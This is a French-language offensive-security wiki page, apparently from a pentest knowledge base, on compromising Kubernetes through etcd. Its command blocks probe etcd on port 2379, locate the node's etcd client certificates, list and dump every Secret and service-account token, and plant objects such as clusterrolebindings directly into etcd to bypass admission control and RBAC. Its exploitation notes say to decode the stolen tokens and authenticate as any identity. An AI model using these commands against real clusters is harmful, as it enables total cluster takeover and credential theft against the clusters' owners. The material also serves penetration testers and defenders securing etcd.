---
title: "etcd : lecture de l'état complet du cluster et des secrets depuis la base"
order: 2
description: "etcd est le magasin clé-valeur qui contient tout l'état de Kubernetes, y compris chaque secret en clair ou sous une forme trivialement décodable. Un etcd accessible sans authentification par certificat client, ou avec des certificats pairs fuités, permet à un attaquant de lire chaque secret et jeton de compte de service du cluster et d'écrire des objets arbitraires, ce qui constitue une compromission totale du cluster."
keywords:
  - etcd
  - port 2379
  - cluster state
  - secrets
  - client certificate
---

# etcd

etcd est la base de données derrière l'API server : chaque objet du cluster, y compris tous les Secrets et jetons de comptes de service, s'y trouve. Kubernetes stocke les Secrets dans etcd encodés en base64 et, sauf si le chiffrement au repos est configuré, non chiffrés, de sorte que lire etcd revient à lire directement chaque secret. etcd devrait exiger un TLS mutuel sur son port client 2379, mais des clusters l'exposent sans imposer de certificat client, ou laissent les certificats pairs et clients à un endroit où un attaquant présent sur un nœud les trouve. Dans les deux cas, atteindre etcd correspond à une compromission complète, car cela contourne l'API server et tout son RBAC.

Sonder et localiser les identifiants :

```bash
curl -sk https://<node>:2379/version                 # reachable
# on a node, the etcd client certs are on disk
ls -l /etc/kubernetes/pki/etcd/
# test unauthenticated vs cert-required access
ETCDCTL_API=3 etcdctl --endpoints=https://<node>:2379 endpoint health 2>&1 | head
```

## Lire chaque secret

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://<node>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/ --prefix --keys-only        # list every secret
# dump a specific secret's value (base64/plain, not encrypted without KMS)
etcdctl ... get /registry/secrets/<ns>/<name>
# service-account tokens live under /registry/secrets too, and are directly usable
```

## Écrire pour injecter des objets

```bash
# etcd writes bypass admission and RBAC entirely; an attacker can plant
# objects (e.g. a clusterrolebinding) the API server will then serve.
etcdctl ... put /registry/clusterrolebindings/<name> "<serialized object>"
```

## Notes d'exploitation

- Lire `/registry/secrets/` livre d'un coup chaque Secret et jeton de compte de service du cluster ; décodez les valeurs et authentifiez-vous sous n'importe quelle identité, ce qui en fait la compromission la plus complète en une seule étape.
- Les Secrets ne sont protégés au repos que si l'API server est configuré avec un fournisseur de chiffrement (KMS ou aescbc) ; sans cela, les valeurs d'etcd sont en clair ou en base64, ce qui correspond à ce que la plupart des clusters fournissent.
- Écrire dans etcd contourne entièrement les contrôleurs d'admission et le RBAC, mais les objets sérialisés doivent respecter le format protobuf/JSON stocké qu'attend l'API server ; les lectures sont la primitive fiable, les écritures sont fragiles.
- Les identifiants etcd sur un nœud sont accessibles après toute compromission de nœud ; voir [Vol d'identifiants kubelet](../pod-escape-to-node/kubelet-credential-theft.md) pour obtenir l'accès au nœud.

## Outils

- [etcdctl](https://github.com/etcd-io/etcd/tree/main/etcdctl)

## Références

- [Kubernetes : sécuriser etcd](https://kubernetes.io/docs/tasks/administer-cluster/configure-upgrade-etcd/)
- [Kubernetes : chiffrer les secrets au repos](https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/)
